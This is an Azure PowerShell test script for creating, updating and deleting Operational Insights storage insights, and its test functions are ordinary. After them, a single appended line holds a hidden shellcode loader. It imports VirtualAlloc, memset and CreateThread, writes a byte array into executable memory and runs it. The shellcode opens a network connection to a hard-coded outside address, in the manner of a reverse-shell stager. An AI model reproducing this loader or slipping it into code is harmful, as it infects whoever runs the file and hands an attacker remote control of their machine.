














function Test-StorageInsightCreateUpdateDelete
{
    $wsname = Get-ResourceName
    $siname = Get-ResourceName
    $saname = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $said = Get-StorageResourceId $rgname $saname
    $wslocation = Get-ProviderLocation
    
    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    
    $workspace = New-AzOperationalInsightsWorkspace -ResourceGroupName $rgname -Name $wsname -Location $wslocation -Sku "STANDARD" -Force

    
    $storageinsight = New-AzOperationalInsightsStorageInsight -ResourceGroupName $rgname -WorkspaceName $wsname -Name $siname -Tables @("WADWindowsEventLogsTable", "LinuxSyslogVer2v0") -Containers @("wad-iis-logfiles") -StorageAccountResourceId $said -StorageAccountKey "fakekey"
    Assert-AreEqual $siname $storageInsight.Name
    Assert-NotNull $storageInsight.ResourceId
    Assert-AreEqual $rgname $storageInsight.ResourceGroupName
    Assert-AreEqual $wsname $storageInsight.WorkspaceName
    Assert-AreEqual $said $storageInsight.StorageAccountResourceId
    Assert-AreEqual "OK" $storageInsight.State
    Assert-AreEqualArray @("WADWindowsEventLogsTable", "LinuxSyslogVer2v0") $storageInsight.Tables
    Assert-AreEqualArray @("wad-iis-logfiles") $storageInsight.Containers

    
    $storageInsight = Get-AzOperationalInsightsStorageInsight -ResourceGroupName $rgname -WorkspaceName $wsname -Name $siname
    Assert-AreEqual $siname $storageInsight.Name
    Assert-NotNull $storageInsight.ResourceId
    Assert-AreEqual $rgname $storageInsight.ResourceGroupName
    Assert-AreEqual $wsname $storageInsight.WorkspaceName
    Assert-AreEqual $said $storageInsight.StorageAccountResourceId
    Assert-AreEqual "OK" $storageInsight.State
    Assert-AreEqualArray @("WADWindowsEventLogsTable", "LinuxSyslogVer2v0") $storageInsight.Tables
    Assert-AreEqualArray @("wad-iis-logfiles") $storageInsight.Containers

    
    $sinametwo = Get-ResourceName
    $storageinsight = New-AzOperationalInsightsStorageInsight -ResourceGroupName $rgname -WorkspaceName $wsname -Name $sinametwo -Tables @("WADWindowsEventLogsTable", "LinuxSyslogVer2v0") -StorageAccountResourceId $said -StorageAccountKey "fakekey"

    
    $storageinsights = Get-AzOperationalInsightsStorageInsight -ResourceGroupName $rgname -WorkspaceName $wsname
    Assert-AreEqual 2 $storageinsights.Count
    Assert-AreEqual 1 ($storageinsights | Where {$_.Name -eq $siname}).Count
    Assert-AreEqual 1 ($storageinsights | Where {$_.Name -eq $sinametwo}).Count

    $storageinsights = Get-AzOperationalInsightsStorageInsight -Workspace $workspace
    Assert-AreEqual 2 $storageinsights.Count
    Assert-AreEqual 1 ($storageinsights | Where {$_.Name -eq $siname}).Count
    Assert-AreEqual 1 ($storageinsights | Where {$_.Name -eq $sinametwo}).Count

    
    Remove-AzOperationalInsightsStorageInsight -ResourceGroupName $rgname -WorkspaceName $wsname -Name $sinametwo -Force
    Assert-ThrowsContains { Get-AzOperationalInsightsStorageInsight -Workspace $workspace -Name $sinametwo } "NotFound"
    $storageinsights = Get-AzOperationalInsightsStorageInsight -Workspace $workspace
    Assert-AreEqual 1 $storageinsights.Count
    Assert-AreEqual 1 ($storageinsights | Where {$_.Name -eq $siname}).Count
    Assert-AreEqual 0 ($storageinsights | Where {$_.Name -eq $sinametwo}).Count

    
    $storageinsight = Set-AzOperationalInsightsStorageInsight -ResourceGroupName $rgname -WorkspaceName $wsname -Name $siname -Tables @("WADWindowsEventLogsTable") -Containers @() -StorageAccountKey "anotherfakekey"
    Assert-AreEqualArray @("WADWindowsEventLogsTable") $storageInsight.Tables
    Assert-AreEqualArray @() $storageInsight.Containers

    $storageinsight = $storageinsight | Set-AzOperationalInsightsStorageInsight -Tables @() -Containers @("wad-iis-logfiles") -StorageAccountKey "anotherfakekey"
    Assert-AreEqualArray @() $storageInsight.Tables
    Assert-AreEqualArray @("wad-iis-logfiles") $storageInsight.Containers

    $storageinsight = New-AzOperationalInsightsStorageInsight -Workspace $workspace -Name $siname -Tables @("WADWindowsEventLogsTable") -Containers @("wad-iis-logfiles") -StorageAccountKey "anotherfakekey" -StorageAccountResourceId $said -Force
    Assert-AreEqualArray @("WADWindowsEventLogsTable") $storageInsight.Tables
    Assert-AreEqualArray @("wad-iis-logfiles") $storageInsight.Containers

    
    Remove-AzOperationalInsightsStorageInsight -Workspace $workspace -Name $siname -Force
    Assert-ThrowsContains { Get-AzOperationalInsightsStorageInsight -Workspace $workspace -Name $siname } "NotFound"
    $storageinsights = Get-AzOperationalInsightsStorageInsight -Workspace $workspace
    Assert-AreEqual 0 $storageinsights.Count
}


function Test-StorageInsightCreateFailsNoWs
{
    $wsname = Get-ResourceName
    $siname = Get-ResourceName
    $saname = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $said = Get-StorageResourceId $rgname $saname
    $wslocation = Get-ProviderLocation
    
    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    Assert-ThrowsContains { New-AzOperationalInsightsStorageInsight -ResourceGroupName $rgname -WorkspaceName $wsname -Name $siname -Tables @("WADWindowsEventLogsTable", "LinuxSyslogVer2v0") -StorageAccountResourceId $said -StorageAccountKey "fakekey" } "NotFound"
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,0xe6,0xea,0x1b,0x68,0x02,0x00,0xb0,0x44,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

